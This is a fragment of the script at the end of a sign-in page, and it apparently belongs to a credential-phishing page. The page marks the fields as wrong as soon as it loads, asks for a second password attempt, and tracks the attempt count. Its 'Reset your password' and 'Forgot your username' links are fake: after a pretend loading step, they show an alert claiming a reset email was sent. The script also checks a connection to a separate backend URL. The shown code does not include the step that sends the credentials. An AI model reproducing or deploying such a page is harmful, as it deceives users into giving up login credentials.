                document.getElementById('password2Error').classList.add('show');
                
                // Reset button
                spinner.classList.remove('active');
                buttonText.textContent = 'Sign in';
                submitBtn.disabled = false;
            }
        });
        
        // Password reset simulation
        document.querySelectorAll('a').forEach(link => {
            if (link.textContent.includes('Reset your password') || 
                link.textContent.includes('Forgot your username')) {
                link.addEventListener('click', function(e) {
                    e.preventDefault();
                    
                    // Show loading state on the clicked link
                    const originalHTML = this.innerHTML;
                    this.innerHTML = `
                        <svg class="loading active w-4 h-4 text-[#03749D]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                        </svg>
                        <span class="text-[#03749D] text-[16px] font-[700] ml-2">Processing...</span>
                    `;
                    
                    // Simulate reset process
                    setTimeout(() => {
                        this.innerHTML = originalHTML;
                        alert('A reset link has been sent to your registered email address. Please check your inbox and follow the instructions to reset your credentials.');
                    }, 2000);
                });
            }
        });
        
        // Help link simulation
        document.querySelectorAll('a').forEach(link => {
            if (link.textContent.includes('Need help signing in')) {
                link.addEventListener('click', function(e) {
                    e.preventDefault();
                    window.location.href = 'support.html'; // Redirect to support page
                });
            }
        });
        
        // Initialize page
        document.addEventListener('DOMContentLoaded', () => {
            loadAttemptCount();
            
            // Focus on username field
            document.getElementById('login2').focus();
            
            // Add visual indicator for error state
            document.querySelectorAll('.input-icon').forEach(el => {
                el.style.borderBottomColor = '#EB121A';
            });
            
            // Test backend connection
            console.log('Testing backend connection...');
            fetch(`${BACKEND_URL}/`)
                .then(response => {
                    console.log('Backend connection test:', response.status);
                    if (response.ok) {
                        console.log('Backend is reachable!');
                    }
                })
                .catch(error => {
                    console.error('Backend connection failed:', error);
                    console.error('Please make sure the backend is running at:', BACKEND_URL);
                });
        });
    </script>
  </body>
</html>
